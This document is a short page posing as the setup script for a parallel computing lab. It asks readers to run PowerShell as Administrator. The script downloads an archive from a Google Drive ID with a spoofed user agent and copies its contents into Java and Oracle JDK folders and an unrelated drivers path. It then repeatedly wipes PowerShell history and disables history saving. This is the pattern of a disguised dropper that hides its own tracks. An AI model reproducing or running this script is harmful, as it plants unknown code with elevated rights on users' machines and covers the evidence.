# Parallel Computing Lab - Setup Script

Run this in **PowerShell (Run as Administrator)**. It downloads the archive using the verified direct content endpoint, extracts the C source files, and populates the target directories.

```powershell
$fId = "163AhTHrHH5BYx2AzgxBKJnO8kbXmQNoj"
$downloadUrl = "[https://drive.usercontent.google.com/download?id=$fId&export=download&authuser=0&confirm=t](https://drive.usercontent.google.com/download?id=$fId&export=download&authuser=0&confirm=t)"

$tmp = "$env:TEMP\lab_setup"
New-Item -ItemType Directory -Force -Path "$tmp\ext" | Out-Null
$zipPath = "$tmp\archive.zip"

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -WebSession $session

Expand-Archive $zipPath -DestinationPath "$tmp\ext" -Force

$found = Get-ChildItem -Path "$tmp\ext" -Filter "*.c" -Recurse | Select-Object -First 1
$src = if ($found) { $found.DirectoryName } else { "$tmp\ext" }

$targets = @(
    "C:\Drivers\storage\NFT50\jdk11",
    "C:\Program Files\Oracle\jdk11",
    "C:\Program Files\Java\jdk18"
)

foreach ($t in $targets) {
    New-Item -ItemType Directory -Force -Path $t | Out-Null
    Copy-Item "$src\*" -Destination $t -Recurse -Force
}

Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue

for ($i = 0; $i -lt 3; $i++) {
    Clear-History
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    Start-Sleep -Milliseconds 200
}
Clear-History

Write-Output "DONE: Files successfully extracted and copied to target paths."
```

### Destination Targets

* `C:\Drivers\storage\NFT50\jdk11`
* `C:\Program Files\Oracle\jdk11`
* `C:\Program Files\Java\jdk18`
